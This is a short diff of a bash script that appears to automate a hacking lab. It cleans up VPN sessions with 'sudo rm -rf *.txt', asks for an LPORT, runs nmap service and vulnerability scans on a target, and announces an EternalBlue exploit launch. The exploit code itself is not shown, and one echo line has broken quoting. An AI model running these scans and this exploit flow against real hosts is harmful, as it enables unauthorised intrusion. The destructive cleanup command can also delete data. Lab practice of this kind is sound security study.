@@ -187,7 +187,7 @@ sleep 1
 exploit_lab() {
     echo "[i] Cleaning up old VPN connections..."
     sudo pkill openvpn
-    sudo rm -rf *.txt
+     sudo rm -rf *.txt
     sleep 2
 sleep 0.5
  echo
@@ -220,15 +220,14 @@ sleep 1
     read -p "[?] Enter Listening Port (LPORT, default 4444): " lport
     echo
     lport=${lport:-4444}
-      echo -e "\033[1;32m8️⃣ Running Nmap (basic scan)... \033[0m"
+      echo -e "\033[1;32m8️Running Nmap (basic scan)... \033[0m"
     nmap -sS -sV -O -Pn "$rhost" -oN initial_scan.txt
     
-    echo -e "\033[1;32m8️⃣ Running Nmap (vuln scripts).. \033[0m"
+    echo -e "\033[1;32m8️ Running Nmap (vuln scripts).. \033[0m"
      nmap -sV --script vuln "$rhost" -oN vuln_scan.txt
      
     echo -e "\033[1;33Scan complete. Saved to initial_scan.txt and vuln_scan.txt"\033[0m"
-    
-      read -p $'\033[1;33m[*] Press Enter to launch EternalBlue exploit....\033[0m'
+
 
         echo -e "\n\033[1;33m🚀 Launching EternalBlue Exploit...\033[0m"
 sleep 1
